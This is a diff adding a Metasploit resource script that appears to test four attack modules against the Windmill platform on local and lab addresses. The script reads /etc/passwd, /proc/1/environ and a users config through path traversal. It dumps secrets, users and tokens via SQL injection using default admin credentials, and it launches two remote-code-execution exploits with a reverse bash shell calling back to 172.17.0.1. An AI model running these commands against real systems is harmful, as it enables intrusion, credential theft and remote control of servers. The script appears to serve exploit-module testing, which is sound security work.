@@ -1,0 +1,136 @@
+# =============================================
+# FULL TEST SUITE - All Windmill Modules
+# =============================================
+# Usage: msfconsole -q -r test_all.rc
+
+# =============================================
+# 1. AUXILIARY: windmill_file_read
+# =============================================
+
+<ruby>
+print_status("=" * 50)
+print_status("Testing: auxiliary/gather/windmill_file_read")
+print_status("=" * 50)
+</ruby>
+
+use auxiliary/gather/windmill_file_read
+
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+set FILEPATH /etc/passwd
+run
+
+set FILEPATH /proc/1/environ
+run
+
+set RHOSTS localhost.local
+set RPORT 443
+set SSL true
+set FILEPATH /nc_app_flow_data/windmill_users_config.json
+run
+
+set RHOSTS 172.23.0.10
+set RPORT 8000
+set SSL false
+set FILEPATH /etc/passwd
+run
+
+# =============================================
+# 2. AUXILIARY: windmill_sqli
+# =============================================
+
+<ruby>
+print_status("=" * 50)
+print_status("Testing: auxiliary/gather/windmill_sqli")
+print_status("=" * 50)
+</ruby>
+
+use auxiliary/gather/windmill_sqli
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+set USERNAME admin@windmill.dev
+set PASSWORD changeme
+
+set ACTION DUMP_SECRETS
+run
+
+set ACTION DUMP_USERS
+run
+
+set ACTION DUMP_TOKENS
+run
+
+set ACTION QUERY
+set SQL version()
+run
+
+set SQL current_database()
+run
+
+# =============================================
+# 3. EXPLOIT: windmill_path_traversal_rce
+# =============================================
+
+<ruby>
+print_status("=" * 50)
+print_status("Testing: exploit/linux/http/windmill_path_traversal_rce")
+print_status("=" * 50)
+</ruby>
+
+use exploit/linux/http/windmill_path_traversal_rce
+set payload cmd/unix/reverse_bash
+set LHOST 172.17.0.1
+
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+check
+exploit -z
+
+set RHOSTS localhost.local
+set RPORT 443
+set SSL true
+check
+exploit -z
+
+set RHOSTS 172.23.0.10
+set RPORT 8000
+set SSL false
+check
+exploit -z
+
+# =============================================
+# 4. EXPLOIT: windmill_sqli_rce
+# =============================================
+
+<ruby>
+print_status("=" * 50)
+print_status("Testing: exploit/linux/http/windmill_sqli_rce")
+print_status("=" * 50)
+</ruby>
+
+use exploit/linux/http/windmill_sqli_rce
+set payload cmd/unix/reverse_bash
+set LHOST 172.17.0.1
+
+set RHOSTS 127.0.0.1
+set RPORT 8000
+set SSL false
+set USERNAME admin@windmill.dev
+set PASSWORD changeme
+check
+exploit -z
+
+# =============================================
+# RESULTS
+# =============================================
+
+<ruby>
+print_status("=" * 50)
+print_status("TEST COMPLETE - Active Sessions:")
+print_status("=" * 50)
+</ruby>
+
+sessions -l
